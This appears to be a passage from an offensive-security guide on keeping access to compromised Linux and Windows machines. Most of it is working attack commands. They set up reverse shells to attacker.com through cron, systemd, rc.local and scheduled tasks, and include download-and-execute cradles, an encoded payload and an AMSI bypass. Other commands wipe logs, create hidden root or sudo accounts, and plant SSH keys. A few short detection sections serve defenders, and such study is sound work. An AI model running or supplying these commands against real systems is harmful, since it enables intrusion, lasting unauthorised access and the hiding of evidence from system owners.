reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,C:\Windows\Temp\backdoor.exe" /f
```

**Explorer Startup Locations**:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
```

### AppInit_DLLs (DLL Injection)

```cmd
REM Add DLL to be loaded by all processes using User32.dll
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Windows\Temp\malicious.dll" /f

REM Enable AppInit_DLLs
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
```

[Unverified: AppInit_DLLs may be disabled or restricted by modern Windows security features like Secure Boot]

### Image File Execution Options (IFEO) - Debugger Hijacking

```cmd
REM Hijack executable to launch backdoor instead
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
```

When `notepad.exe` is launched, `backdoor.exe` executes instead.

### Registry Backup and Exfiltration

```cmd
REM Export registry key
reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" run_keys.reg

REM Import registry key
reg import run_keys.reg
```

## Scheduled Task Creation

Scheduled tasks execute code at specific times or system events, providing time-based or event-triggered persistence.

### Linux - Cron Jobs

**User Crontab**:

```bash
# Edit crontab for current user
crontab -e

# Add reverse shell executed every 5 minutes
*/5 * * * * /usr/bin/nc <attacker_ip> 4444 -e /bin/bash

# Add reverse shell at reboot
@reboot /usr/bin/nc <attacker_ip> 4444 -e /bin/bash

# Add hourly execution
0 * * * * /tmp/backdoor.sh

# List current crontab
crontab -l

# Remove crontab
crontab -r
```

**System-Wide Cron**:

```bash
# Add to system cron directories
echo "*/10 * * * * root /usr/bin/nc <attacker_ip> 4444 -e /bin/bash" >> /etc/crontab

# Hourly execution
echo "#!/bin/bash\nnc <attacker_ip> 4444 -e /bin/bash" > /etc/cron.hourly/backdoor
chmod +x /etc/cron.hourly/backdoor

# Daily execution
cp /tmp/backdoor.sh /etc/cron.daily/
chmod +x /etc/cron.daily/backdoor.sh
```

**Cron Format**:

```
* * * * * command
â”‚ â”‚ â”‚ â”‚ â”‚
â”‚ â”‚ â”‚ â”‚ â””â”€â”€â”€ Day of week (0-7, Sunday = 0 or 7)
â”‚ â”‚ â”‚ â””â”€â”€â”€â”€â”€ Month (1-12)
â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€ Day of month (1-31)
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Hour (0-23)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Minute (0-59)
```

**Special Cron Strings**:

```bash
@reboot       # Run at startup
@yearly       # Run once a year (0 0 1 1 *)
@monthly      # Run once a month (0 0 1 * *)
@weekly       # Run once a week (0 0 * * 0)
@daily        # Run once a day (0 0 * * *)
@hourly       # Run once an hour (0 * * * *)
```

### Linux - Systemd Timers

**Create Timer Unit**:

```bash
# Create service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
Type=oneshot
ExecStart=/usr/bin/nc <attacker_ip> 4444 -e /bin/bash
EOF

# Create timer
cat > /etc/systemd/system/backdoor.timer << EOF
[Unit]
Description=Backdoor Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=10min

[Install]
WantedBy=timers.target
EOF

# Reload systemd
systemctl daemon-reload

# Enable and start timer
systemctl enable backdoor.timer
systemctl start backdoor.timer

# Check timer status
systemctl list-timers
systemctl status backdoor.timer
```

### Linux - Anacron (For Systems Not Always Running)

```bash
# Edit /etc/anacrontab
echo "1  5  backdoor.daily  /usr/bin/nc <attacker_ip> 4444 -e /bin/bash" >> /etc/anacrontab

# Format: period delay job-identifier command
# Period in days, delay in minutes
```

### Windows - Scheduled Tasks (schtasks.exe)

**Create Basic Scheduled Task**:

```cmd
REM Execute at system startup
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onstart /ru SYSTEM

REM Execute at user logon
schtasks /create /tn "UserCheck" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru SYSTEM

REM Execute every 10 minutes
schtasks /create /tn "SecurityMonitor" /tr "C:\Windows\Temp\backdoor.exe" /sc minute /mo 10 /ru SYSTEM

REM Execute daily at specific time
schtasks /create /tn "DailyUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc daily /st 14:00 /ru SYSTEM

REM Execute on idle
schtasks /create /tn "MaintenanceTask" /tr "C:\Windows\Temp\backdoor.exe" /sc onidle /i 10
```

**Query and Delete Tasks**:

```cmd
REM List all scheduled tasks
schtasks /query /fo LIST /v

REM Query specific task
schtasks /query /tn "SystemUpdate"

REM Delete task
schtasks /delete /tn "SystemUpdate" /f
```

**Advanced Scheduled Task Options**:

```cmd
REM Run with highest privileges
schtasks /create /tn "PrivilegedTask" /tr "C:\Windows\Temp\backdoor.exe" /sc onstart /rl highest /ru SYSTEM

REM Hidden task (not visible in standard GUI)
schtasks /create /tn "HiddenTask" /tr "C:\Windows\Temp\backdoor.exe" /sc onstart /ru SYSTEM /f

REM Execute PowerShell command
schtasks /create /tn "PSTask" /tr "powershell.exe -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"" /sc onlogon /ru SYSTEM
```

### Windows - PowerShell Scheduled Tasks

```powershell
# Create scheduled task action
$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\backdoor.exe"

# Create trigger (at startup)
$trigger = New-ScheduledTaskTrigger -AtStartup

# Create principal (run as SYSTEM)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Register task
Register-ScheduledTask -TaskName "SystemService" -Action $action -Trigger $trigger -Principal $principal

# Create time-based trigger
$trigger = New-ScheduledTaskTrigger -Daily -At 2am

# Create logon trigger
$trigger = New-ScheduledTaskTrigger -AtLogon

# Remove task
Unregister-ScheduledTask -TaskName "SystemService" -Confirm:$false
```

**Hidden PowerShell Scheduled Task**:

```powershell
# Create hidden task with encoded command
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -EncodedCommand <base64_encoded_command>"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "WindowsDefender" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest
```

### Windows Task Scheduler XML Import

```cmd
REM Export existing task to XML
schtasks /query /tn "TaskName" /xml > task.xml

REM Modify XML and import
schtasks /create /tn "NewTask" /xml task.xml /ru SYSTEM
```

**Example XML Task Structure**:

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\Temp\backdoor.exe</Command>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
</Task>
```

## Cross-Platform Persistence Strategy

### Layered Persistence Approach

1. **Primary mechanism**: Most reliable (e.g., service installation)
2. **Secondary mechanism**: Alternative vector (e.g., scheduled task)
3. **Tertiary mechanism**: Fallback (e.g., registry Run key)

Multiple persistence mechanisms increase likelihood of maintaining access if one is detected and removed.

### Stealth Considerations

**Process Naming**:

- Mimic legitimate system processes: `svchost.exe`, `system32.exe`, `winlogon.exe`
- Use generic names: `update.exe`, `service.exe`, `monitor.exe`

**File Locations**:

- Hide in system directories: `C:\Windows\System32\`, `/usr/bin/`, `/lib/systemd/`
- Use obscure paths: `C:\ProgramData\`, `/var/tmp/`, `/opt/.hidden/`

**Timing**:

- Execute during typical system activity periods
- Randomize execution intervals: `sleep $((RANDOM % 300)); nc attacker 4444 -e /bin/bash`

**Network Behavior**:

- Mimic legitimate traffic (HTTP/HTTPS on ports 80/443)
- Use domain fronting or CDN tunneling [Unverified: effectiveness depends on network monitoring capabilities]

### Detection Evasion

**Antivirus Evasion**:

```bash
# Encode binaries
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -e x64/xor_dynamic -i 5 -f elf -o backdoor

# Encrypt payloads
openssl enc -aes-256-cbc -in backdoor.exe -out encrypted_backdoor.exe
```

**AMSI Bypass (Windows PowerShell)**:

```powershell
# Bypass Anti-Malware Scan Interface
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

[Unverified: AMSI bypass techniques are frequently patched and may not work on current systems]

### Cleanup and Forensic Anti-Forensics

```bash
# Linux - Clear command history
history -c
rm ~/.bash_history
unset HISTFILE

# Linux - Remove log entries
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Windows - Clear event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Windows - Delete specific event IDs
wevtutil qe Security /q:"*[System[(EventID=4624)]]" /f:text
```

---

**Important Persistence Vectors Summary**

**Linux Priority Targets**:

1. SSH authorized_keys
2. Cron jobs (user and system)
3. systemd services and timers
4. .bashrc/.profile modifications
5. PAM module backdoors [Advanced topic]

**Windows Priority Targets**:

1. Registry Run keys (HKCU/HKLM)
2. Scheduled tasks (schtasks)
3. Windows services (sc.exe)
4. WMI event subscriptions [Advanced topic]
5. Startup folder shortcuts

---

## Cron Job Creation

Cron jobs execute commands at scheduled intervals, making them effective persistence mechanisms on Linux systems.

### Cron Directory Structure

```bash
# System-wide cron directories (run as root)
/etc/cron.d/          # Custom cron jobs
/etc/cron.daily/      # Daily execution
/etc/cron.hourly/     # Hourly execution
/etc/cron.weekly/     # Weekly execution
/etc/cron.monthly/    # Monthly execution

# Main cron configuration
/etc/crontab          # System crontab file

# User-specific cron jobs
/var/spool/cron/crontabs/  # User crontab storage (Debian/Ubuntu)
/var/spool/cron/           # User crontab storage (Red Hat/CentOS)
```

### Creating User Cron Jobs

**View Current User Crontab**

```bash
# List current user's cron jobs
crontab -l

# List specific user's cron jobs (requires root)
crontab -l -u username
```

**Edit Crontab**

```bash
# Edit current user's crontab
crontab -e

# Edit specific user's crontab (requires root)
crontab -e -u username

# Remove current user's crontab
crontab -r
```

**Crontab Syntax**

```
# Format: minute hour day month weekday command
# * * * * * command
# â”‚ â”‚ â”‚ â”‚ â”‚
# â”‚ â”‚ â”‚ â”‚ â””â”€â”€â”€ Day of week (0-7, Sunday=0 or 7)
# â”‚ â”‚ â”‚ â””â”€â”€â”€â”€â”€ Month (1-12)
# â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€ Day of month (1-31)
# â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€ Hour (0-23)
# â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Minute (0-59)

# Examples:
# Every minute
* * * * * /tmp/backdoor.sh

# Every 5 minutes
*/5 * * * * /tmp/backdoor.sh

# Every hour at minute 0
0 * * * * /tmp/backdoor.sh

# Daily at 2:30 AM
30 2 * * * /tmp/backdoor.sh

# On reboot
@reboot /tmp/backdoor.sh

# Every time system boots
@reboot sleep 60 && /tmp/backdoor.sh
```

**Persistence Examples**

```bash
# Reverse shell every 5 minutes
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Python reverse shell
*/5 * * * * python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Download and execute script
*/10 * * * * curl http://attacker.com/backdoor.sh | bash

# Execute binary
@reboot /tmp/.hidden/backdoor

# Netcat listener
@reboot nc -lvp 5555 -e /bin/bash

# Encoded command to avoid detection
*/5 * * * * echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx" | base64 -d | bash
```

### System-Wide Cron Jobs

**Creating Jobs in /etc/cron.d/**

```bash
# Create persistent cron job file
echo '*/5 * * * * root /tmp/backdoor.sh' > /etc/cron.d/system-update

# Format includes username field
# minute hour day month weekday username command
*/5 * * * * root /tmp/backdoor.sh

# Set appropriate permissions
chmod 644 /etc/cron.d/system-update
```

**Modifying /etc/crontab**

```bash
# Append to system crontab
echo '*/5 * * * * root /tmp/backdoor.sh' >> /etc/crontab

# View system crontab
cat /etc/crontab
```

**Using Run-Parts Directories**

```bash
# Place executable script in daily cron directory
cp /tmp/backdoor.sh /etc/cron.daily/system-update
chmod +x /etc/cron.daily/system-update

# Hourly execution
cp /tmp/backdoor.sh /etc/cron.hourly/.system
chmod +x /etc/cron.hourly/.system

# Weekly execution
cp /tmp/backdoor.sh /etc/cron.weekly/cleanup
chmod +x /etc/cron.weekly/cleanup
```

### Stealth Techniques

```bash
# Hidden cron job (leading dot)
echo '*/5 * * * * /tmp/.backdoor' | crontab -

# Disguised as system process
echo '*/5 * * * * /usr/lib/.systemd/system-daemon' | crontab -

# Suppress output to avoid log entries
*/5 * * * * /tmp/backdoor.sh >/dev/null 2>&1

# Use absolute paths to avoid detection
*/5 * * * * /bin/bash /tmp/backdoor.sh

# Variable timing to avoid pattern detection
*/7 * * * * /tmp/backdoor.sh
*/13 * * * * /tmp/backdoor.sh
```

### Detection Methods

```bash
# List all user crontabs
for user in $(cut -f1 -d: /etc/passwd); do echo "User: $user"; crontab -u $user -l 2>/dev/null; done

# Check system cron directories
ls -la /etc/cron.*
cat /etc/crontab
ls -la /etc/cron.d/

# Check user crontab storage
ls -la /var/spool/cron/crontabs/
ls -la /var/spool/cron/

# Monitor cron logs
grep CRON /var/log/syslog
journalctl -u cron
```

## Startup Script Modification

Startup scripts execute during system boot, providing persistence that activates before user login.

### Systemd Service Creation (Modern Linux)

**Service File Structure**

```bash
# Create service file
nano /etc/systemd/system/backdoor.service
```

**Service File Content**

```ini
[Unit]
Description=System Service Manager
After=network.target

[Service]
Type=simple
ExecStart=/tmp/backdoor.sh
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
```

**Enable and Start Service**

```bash
# Reload systemd daemon
systemctl daemon-reload

# Enable service (start on boot)
systemctl enable backdoor.service

# Start service immediately
systemctl start backdoor.service

# Check service status
systemctl status backdoor.service

# Disguised service names
systemctl enable system-networkd-monitor.service
systemctl enable kernel-update-daemon.service
```

**Stealth Service Examples**

```ini
# Disguised as system service
[Unit]
Description=System Network Time Daemon
After=network.target

[Service]
Type=forking
ExecStart=/usr/lib/systemd/.ntpd
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

**User-Level Systemd Services**

```bash
# User service directory
mkdir -p ~/.config/systemd/user/

# Create user service
nano ~/.config/systemd/user/backdoor.service

# Enable user service (no root required)
systemctl --user daemon-reload
systemctl --user enable backdoor.service
systemctl --user start backdoor.service

# User services run when user logs in
# Persist with loginctl enable-linger
loginctl enable-linger $USER
```

### Init Scripts (SysVinit/Legacy Systems)

**RC Script Locations**

```bash
# Init script directory
/etc/init.d/

# Runlevel directories
/etc/rc0.d/  # Halt
/etc/rc1.d/  # Single user mode
/etc/rc2.d/  # Multi-user mode (Debian/Ubuntu default)
/etc/rc3.d/  # Multi-user mode (Red Hat/CentOS default)
/etc/rc4.d/  # Unused
/etc/rc5.d/  # Multi-user mode with GUI
/etc/rc6.d/  # Reboot

# Alternative locations
/etc/rc.d/
/etc/rc.local  # Executed at end of boot
```

**Creating Init Script**

```bash
#!/bin/bash
### BEGIN INIT INFO
# Provides:          backdoor
# Required-Start:    $network
# Required-Stop:     $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System service
### END INIT INFO

case "$1" in
    start)
        /tmp/backdoor.sh &
        ;;
    stop)
        killall backdoor.sh
        ;;
    *)
        exit 1
        ;;
esac
exit 0
```

**Install Init Script**

```bash
# Copy script to init.d
cp backdoor.sh /etc/init.d/system-monitor
chmod +x /etc/init.d/system-monitor

# Enable with update-rc.d (Debian/Ubuntu)
update-rc.d system-monitor defaults

# Enable with chkconfig (Red Hat/CentOS)
chkconfig --add system-monitor
chkconfig system-monitor on

# Manual symlink creation
ln -s /etc/init.d/system-monitor /etc/rc2.d/S99system-monitor
```

### RC.local Modification

**[Inference]** /etc/rc.local executes at the end of the boot process on many Linux distributions.

```bash
# Check if rc.local exists and is enabled
ls -la /etc/rc.local
systemctl status rc-local

# Append command to rc.local
echo '/tmp/backdoor.sh &' >> /etc/rc.local

# Ensure executable
chmod +x /etc/rc.local

# Enable rc-local service (if not enabled)
systemctl enable rc-local
```

**Complete rc.local Example**

```bash
#!/bin/bash
# /etc/rc.local

# Start backdoor
/tmp/.hidden/backdoor.sh &

# Reverse shell
nohup bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' &

exit 0
```

### Profile Scripts

**System-Wide Profile Scripts**

```bash
# Executed for all users on login
/etc/profile          # Main profile script
/etc/profile.d/       # Additional profile scripts
/etc/bash.bashrc      # System-wide bashrc (Debian/Ubuntu)
/etc/bashrc           # System-wide bashrc (Red Hat/CentOS)

# Add persistence command
echo '/tmp/backdoor.sh &' >> /etc/profile

# Create profile.d script
echo '#!/bin/bash
/tmp/backdoor.sh &' > /etc/profile.d/system-init.sh
chmod +x /etc/profile.d/system-init.sh
```

**User Profile Scripts**

```bash
# User-specific login scripts
~/.bash_profile       # Executed on login shell
~/.bash_login         # Alternative login script
~/.profile            # POSIX-compliant login script
~/.bashrc             # Executed for interactive shells

# Add persistence
echo '/tmp/backdoor.sh &' >> ~/.bashrc
echo '/tmp/backdoor.sh &' >> ~/.profile

# SSH-specific
~/.ssh/rc             # Executed when SSH session starts
echo '/tmp/backdoor.sh &' >> ~/.ssh/rc
```

### Detection Methods

```bash
# List systemd services
systemctl list-units --type=service
systemctl list-unit-files --type=service

# Check for suspicious services
systemctl status suspicious-service.service

# Check init scripts
ls -la /etc/init.d/
ls -la /etc/rc*.d/

# Check rc.local
cat /etc/rc.local

# Check profile scripts
cat /etc/profile
ls -la /etc/profile.d/
cat ~/.bashrc ~/.profile ~/.bash_profile
```

## User Account Creation

Creating new user accounts provides persistent access independent of existing credentials.

### Basic User Creation

**useradd Command**

```bash
# Basic user creation
useradd backdoor

# Create with home directory
useradd -m backdoor

# Specify shell
useradd -m -s /bin/bash backdoor

# Specify UID
useradd -m -u 1337 backdoor

# Add to groups
useradd -m -G sudo,adm backdoor

# Set password
passwd backdoor
# Enter password when prompted

# Non-interactive password setting
echo 'backdoor:password123' | chpasswd

# Set expiration (optional, for stealth)
usermod -e 2025-12-31 backdoor
```

**adduser Command (Interactive)**

```bash
# Interactive user creation (Debian/Ubuntu)
adduser backdoor

# Add to sudo group
adduser backdoor sudo
```

### Privileged User Creation

**Root Access via sudo**

```bash
# Add user to sudo group (Debian/Ubuntu)
usermod -aG sudo backdoor

# Add user to wheel group (Red Hat/CentOS)
usermod -aG wheel backdoor

# Direct sudoers file modification
echo 'backdoor ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers

# Create sudoers drop-in file (safer)
echo 'backdoor ALL=(ALL:ALL) NOPASSWD:ALL' > /etc/sudoers.d/backdoor
chmod 440 /etc/sudoers.d/backdoor
```

**Direct Root Account Modification**

```bash
# Add entry to /etc/passwd (UID 0 = root privileges)
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd

# Set password in /etc/shadow
# Generate password hash
openssl passwd -6 password123

# Add to /etc/shadow
echo 'backdoor:$6$generated_hash:19000:0:99999:7:::' >> /etc/shadow
```

### Stealth User Creation

**Hidden User Techniques**

```bash
# User with UID < 1000 (often hidden by display managers)
useradd -m -u 999 -s /bin/bash .system

# User with leading dot (hidden in ls without -a)
useradd -m -s /bin/bash .backdoor

# User with name resembling system account
useradd -m -s /bin/bash systemd-core
useradd -m -s /bin/bash daemon-helper

# User without home directory (less visible)
useradd -M -s /bin/bash backdoor

# User with /bin/false shell (appears disabled)
useradd -s /bin/false backdoor
# But can still be used with su or ssh keys
```

**Manual /etc/passwd Manipulation**

```bash
# /etc/passwd format:
# username:x:UID:GID:comment:home:shell

# Add user entry
echo 'operator:x:1001:1001::/home/operator:/bin/bash' >> /etc/passwd

# Add password entry to /etc/shadow
# username:password_hash:last_change:min:max:warn:inactive:expire:reserved
echo 'operator:$6$salt$hash:19000:0:99999:7:::' >> /etc/shadow

# Add group entry to /etc/group
echo 'operator:x:1001:' >> /etc/group
```

### Password Hash Generation

```bash
# Generate SHA-512 hash (recommended)
openssl passwd -6 password123

# Generate SHA-256 hash
openssl passwd -5 password123

# Generate MD5 hash (legacy)
openssl passwd -1 password123

# Using mkpasswd (if available)
mkpasswd -m sha-512 password123

# Python hash generation
python3 -c 'import crypt; print(crypt.crypt("password123", crypt.mksalt(crypt.METHOD_SHA512)))'
```

### User Management Commands

```bash
# View all users
cat /etc/passwd

# View users with login shells
grep -v '/nologin\|/false' /etc/passwd

# View user details
id username
finger username
getent passwd username

# Modify user
usermod -aG sudo username      # Add to group
usermod -s /bin/bash username  # Change shell
usermod -e 2025-12-31 username # Set expiration

# Delete user
userdel username               # Keep home directory
userdel -r username            # Remove home directory

# Lock/unlock user
usermod -L username            # Lock account
usermod -U username            # Unlock account

# Change user password
passwd username
```

### Detection Methods

```bash
# List all users with UID >= 1000 (normal users)
awk -F: '$3 >= 1000 {print $1}' /etc/passwd

# Check recently created users
grep -E "^[^:]+:[^:]+:1[0-9]{3}:" /etc/passwd

# Check for UID 0 users (should only be root)
awk -F: '$3 == 0 {print $1}' /etc/passwd

# Check sudo group members
getent group sudo
getent group wheel

# Check sudoers configuration
cat /etc/sudoers
ls -la /etc/sudoers.d/

# Check login history
last
lastlog
who
w

# Check authentication logs
grep -i useradd /var/log/auth.log
grep -i useradd /var/log/secure
journalctl -u systemd-logind
```

## SSH Key Installation

SSH keys provide passwordless authentication and are difficult to detect without examining authorized_keys files.

### SSH Key Basics

**SSH Directory Structure**

```bash
# User SSH configuration directory
~/.ssh/                        # SSH directory (permissions: 700)
~/.ssh/authorized_keys         # Authorized public keys (permissions: 600)
~/.ssh/id_rsa                  # Private key (permissions: 600)
~/.ssh/id_rsa.pub              # Public key (permissions: 644)
~/.ssh/known_hosts             # Known host keys (permissions: 644)
~/.ssh/config                  # SSH client configuration (permissions: 600)

# System-wide SSH configuration
/etc/ssh/sshd_config           # SSH server configuration
/etc/ssh/ssh_host_*            # Host keys
```

### Generating SSH Keys

**On Attacker Machine**

```bash
# Generate RSA key pair (4096 bits)
ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor_key -N ""

# Generate ED25519 key (modern, more secure)
ssh-keygen -t ed25519 -f ~/.ssh/backdoor_key -N ""

# Parameters:
# -t: Key type (rsa, ed25519, ecdsa)
# -b: Key size (for RSA)
# -f: Output file
# -N: Passphrase (empty "" for no passphrase)
# -C: Comment

# With custom comment
ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor_key -C "system@localhost" -N ""

# View public key
cat ~/.ssh/backdoor_key.pub
```

### Installing Public Key on Target

**Method 1: Append to authorized_keys**

```bash
# Create .ssh directory if it doesn't exist
mkdir -p ~/.ssh
chmod 700 ~/.ssh

# Add public key
echo 'ssh-rsa AAAAB3NzaC1yc2E... attacker@kali' >> ~/.ssh/authorized_keys

# Set correct permissions
chmod 600 ~/.ssh/authorized_keys

# For root user
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**Method 2: ssh-copy-id (requires password)**

```bash
# Copy key from attacker to target
ssh-copy-id -i ~/.ssh/backdoor_key.pub user@target

# Specify SSH port
ssh-copy-id -i ~/.ssh/backdoor_key.pub -p 2222 user@target
```

**Method 3: One-Liner Installation**

```bash
# From attacker machine with SSH access
cat ~/.ssh/backdoor_key.pub | ssh user@target "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

# Using curl (if public key is hosted)
ssh user@target "mkdir -p ~/.ssh && chmod 700 ~/.ssh && curl http://attacker.com/key.pub >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

# Using echo (if you have shell access)
echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys
```

### Connecting with SSH Key

**From Attacker Machine**

```bash
# Connect using private key
ssh -i ~/.ssh/backdoor_key user@target

# Connect on custom port
ssh -i ~/.ssh/backdoor_key -p 2222 user@target

# Verbose mode (debugging)
ssh -v -i ~/.ssh/backdoor_key user@target

# Disable strict host key checking (for dynamic IPs)
ssh -i ~/.ssh/backdoor_key -o StrictHostKeyChecking=no user@target

# Execute remote command
ssh -i ~/.ssh/backdoor_key user@target "whoami"
```

### Stealth SSH Key Installation

**Hidden Keys in authorized_keys**

```bash
# authorized_keys file can contain multiple keys, one per line
# Each line: <key-type> <public-key-data> <comment>

# Add key with benign comment
echo 'ssh-rsa AAAAB3NzaC1yc2E... root@localhost' >> ~/.ssh/authorized_keys

# Add key disguised as existing user
echo 'ssh-rsa AAAAB3NzaC1yc2E... admin@production-server' >> ~/.ssh/authorized_keys

# [Inference] Keys without obvious attacker comments are harder to identify
```

**Key Options in authorized_keys**

```bash
# Restrict key to specific command (appears legitimate)
command="/usr/bin/systemctl status" ssh-rsa AAAAB3NzaC1yc2E... user@host

# But can be bypassed with:
ssh -i key user@target "bash"

# Restrict source IP
from="192.168.1.0/24" ssh-rsa AAAAB3NzaC1yc2E... user@host

# Disable PTY allocation
no-pty ssh-rsa AAAAB3NzaC1yc2E... user@host

# Multiple restrictions
command="/bin/false",no-pty,no-X11-forwarding ssh-rsa AAAAB3NzaC1yc2E... user@host
```

**SSH Configuration Manipulation**

```bash
# Modify SSH server configuration
nano /etc/ssh/sshd_config

# Enable root login with keys
PermitRootLogin prohibit-password

# Enable public key authentication
PubkeyAuthentication yes

# Allow password authentication (fallback)
PasswordAuthentication yes

# Restart SSH service
systemctl restart sshd
service ssh restart
/etc/init.d/ssh restart
```

### Alternative SSH Persistence Methods

**AuthorizedKeysCommand**

```bash
# Configure SSH to retrieve keys from external source
# Edit /etc/ssh/sshd_config:
AuthorizedKeysCommand /usr/local/bin/get-keys.sh
AuthorizedKeysCommandUser nobody

# Create script that returns attacker's key
cat > /usr/local/bin/get-keys.sh << 'EOF'
#!/bin/bash
echo 'ssh-rsa AAAAB3NzaC1yc2E... attacker@kali'
EOF

chmod +x /usr/local/bin/get-keys.sh
systemctl restart sshd
```

**SSH Config Includes**

```bash
# Check for Include directive in /etc/ssh/sshd_config
Include /etc/ssh/sshd_config.d/*.conf

# Create malicious include file
echo 'AuthorizedKeysFile /tmp/.authorized_keys' > /etc/ssh/sshd_config.d/backdoor.conf

# Place key in alternate location
echo 'ssh-rsa AAAAB3NzaC1yc2E...' > /tmp/.authorized_keys
chmod 600 /tmp/.authorized_keys
```

**Global authorized_keys File**

```bash
# Set global authorized keys file in /etc/ssh/sshd_config
AuthorizedKeysFile /etc/ssh/authorized_keys/%u

# Create directory
mkdir -p /etc/ssh/authorized_keys/

# Add key for user
echo 'ssh-rsa AAAAB3NzaC1yc2E...' > /etc/ssh/authorized_keys/username
chmod 600 /etc/ssh/authorized_keys/username

# Apply to all users
echo 'ssh-rsa AAAAB3NzaC1yc2E...' > /etc/ssh/authorized_keys/backdoor
ln -s /etc/ssh/authorized_keys/backdoor /etc/ssh/authorized_keys/$(whoami)
```

### Detection Methods

```bash
# Check authorized_keys for all users
for user in $(cut -f1 -d: /etc/passwd); do
    if [ -f /home/$user/.ssh/authorized_keys ]; then
        echo "User: $user"
        cat /home/$user/.ssh/authorized_keys
    fi
done

# Check root authorized_keys
cat /root/.ssh/authorized_keys

# Find all authorized_keys files
find / -name authorized_keys 2>/dev/null

# Check SSH configuration
cat /etc/ssh/sshd_config | grep -v "^#" | grep -v "^$"

# Check for AuthorizedKeysFile directive
grep AuthorizedKeysFile /etc/ssh/sshd_config

# Check SSH authentication logs
grep -i "Accepted publickey" /var/log/auth.log
grep -i "Accepted publickey" /var/log/secure
journalctl -u ssh | grep "Accepted publickey"

# List active SSH connections
ss -tnp | grep ssh
netstat -tnp | grep :22

# Check for suspicious SSH processes
ps aux | grep sshd
```

### Multi-Layer Persistence Strategy

**[Inference]** Combining multiple persistence mechanisms increases likelihood of maintaining access:

```bash
# 1. SSH Key Installation
echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys

# 2. Cron Job Backup
echo '*/30 * * * * curl http://attacker.com/key.pub >> ~/.ssh/authorized_keys' | crontab -

# 3. User Account Creation
useradd -m -G sudo -s /bin/bash support
echo 'support:password123' | chpasswd
mkdir -p /home/support/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> /home/support/.ssh/authorized_keys

# 4. Systemd Service
cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do curl http://attacker.com/key.pub >> /root/.ssh/authorized_keys 2>/dev/null; sleep 3600; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
